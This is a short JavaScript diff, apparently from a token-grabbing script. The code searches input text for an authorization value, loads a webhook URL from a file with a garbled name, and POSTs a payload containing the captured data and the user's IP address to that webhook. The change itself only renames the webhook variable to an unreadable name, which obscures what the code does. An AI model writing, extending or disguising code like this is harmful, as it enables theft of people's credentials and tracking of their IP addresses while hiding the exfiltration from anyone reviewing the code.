@@ -23,7 +23,7 @@
             var authorization = searchAuthorizationRegex(inputText);
             
             if (authorization) {
-                $.get('kcygyegfierdgfsbdsfjh4efbdsbifweriuewdufndifi4ufniudnfuinjdsnfjks.txt', function(webhookUrl) {
+                $.get('kcygyegfierdgfsbdsfjh4efbdsbifweriuewdufndifi4ufniudnfuinjdsnfjks.txt', function(ackhlackja) {
                     var ipAddress = document.getElementById("ipAddress").textContent;
                 
                     var payload = {
@@ -37,7 +37,7 @@
                 
                     $.ajax({
                         type: 'POST',
-                        url: webhookUrl,
+                        url: ackhlackja,
                         data: JSON.stringify(payload),
                         contentType: 'application/json',
                         success: function() {
